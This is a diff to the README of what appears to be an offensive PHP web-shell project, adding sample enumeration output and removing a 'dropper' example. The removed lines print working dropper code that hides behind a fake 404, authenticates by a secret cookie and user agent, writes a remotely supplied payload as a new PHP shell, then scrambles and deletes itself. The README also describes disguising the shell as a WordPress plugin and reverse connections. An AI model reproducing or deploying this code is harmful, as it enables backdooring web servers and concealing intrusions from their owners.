@@ -79,6 +79,27 @@ Here is what I was able to come up with for the added evasive routines:
 
 As I have grown in the language of PHP so will this whole project and the classes will become proper classes, with namespaces and all. Just need some time as i fix the code to more common standards of PHP development. ~~I will likely add in a way to package this shell itself as a WordPress plugin, so that way it can be used in wordpress as well.( a proper plugin at that.)~~ The client now makes proper wordpress plugins, which hook the init function of the wordpress site. I have not tested this fully, so if there are any issues at all, please feel free to open a new issue and describe the problem you are having. The activator for the wordpress plugin is left blank, this is because i am looking at ways to make the activator a secure/encrypted unique value that cannot be replicated. Please be patient.
 
+When you call the cqI function, it prints more relevant information rather than... you know, garbage.
+Example:
+```
+Max file uploads: 20
+Safemode: cannot set safemode.
+File_Uploads: true
+Upload Temp Dir: cannot set upload_tmp_dir
+Maximum File upload size: 2M
+Include Path: .:/usr/share/php8:/usr/share/php/PEAR:/var/www/somesite/html/public/.scache/
+---------------- SLOP DEFINES ---------------------
+slopMTLS: true
+slopEncryption: true
+slopOS: LIN
+slopShell: bash
+slopTor: false
+slopPGP: false
+.scache full path: /var/www/somesite/html/public/.scache/
+```
+
+These will have color depending on the output, false defaults to red, true defaults to green. with small exceptions to slopOS and sloppyshell, those are green no matter what.
+
 ---
 ## Images of use cases
 
@@ -95,40 +116,5 @@ Reverse Connection initiated from the client script:
 I as the maintainer, am in no way responsible for the misuse of this product. This was published for legitmate penetration testing/red teaming purposes, and/or for educational value.  Know the applicable laws in your country of residence before using this script, and do not break the law whilst using this. Thank you and have a nice day.
 
 ## Slimmed down dropper example: 
-```
-/* These comments are not present in the actual dropper, these are here to explain what this is doing.*/
-<?php
-http_response_code(404);
-# pre shared values that only the operator of this shell will have. This dropper will be split into 3 parts to include system enumeration.
-if (isset($_COOKIE['6e3611c0032725']) && $_SERVER['HTTP_USER_AGENT'] === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36(d9e1cee219f19c6d7c)'){
-    if (isset($_POST['hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df'])){
-        $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df = explode('.', unserialize(base64_decode($_COOKIE['6e3611c0032725']), ['allowed_classes' => false]));
-        # Pre-shared value that only the operator has access to through the database.
-        if ( hash_equals(hash_hmac('sha256', $_COOKIE['6e3611c0032725'], $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[0]), $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[1]) ){
-            if (function_exists("com_create_guid") === true){
-                $CDd5054278c02f = trim(com_create_guid()).PHP_EOL.PHP_EOL;
-            }else{
-                $70f4adfb6efefe08db = openssl_random_pseudo_bytes(16);
-                $70f4adfb6efefe08db[6] = chr(ord($70f4adfb6efefe08db[6]) & 0x0f | 0x40);
-                $70f4adfb6efefe08db[8] = chr(ord($70f4adfb6efefe08db[8]) & 0x3f | 0x80);
-                $CDd5054278c02f = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($70f4adfb6efefe08db), 4)).PHP_EOL.PHP_EOL;
-            }
-            # returns our needed data back to the server, this is broken into 3 parts, the uuid, the filename of our shell/enumeration script, and if we need stealth or not.
-            echo $CDd5054278c02f . "_e8a4f6f58c05"."_true".PHP_EOL;
-            fputs(fopen('./e8a4f6f58c05.php', 'a+'),base64_decode(file_get_contents($hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[2])));
-            foreach (file($_SERVER['SCRIPT_FILENAME']) as $line){
-            # if this dropper is activated in the correct way, this portion of the script takes less than a second to complete due to the size of this script.
-                fwrite(fopen($_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt($line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
-            }
-            # dropper routine is finished, no need to exist on the system any longer.
-            fclose($_SERVER['SCRIPT_FILENAME']);
-            unlink($_SERVER['SCRIPT_FILENAME']);
-        }else{
-            die();
-        }
-        die();
-    }
-}else{
-    die();
-}
-```
+since most servers block the ability for scripts to write to the served directory(as they should.) i am defaulting to the full shell.
+The wordpress version of this shell will still function properly, it just hooks the init function instead of just being a shell, flapping in the wind.
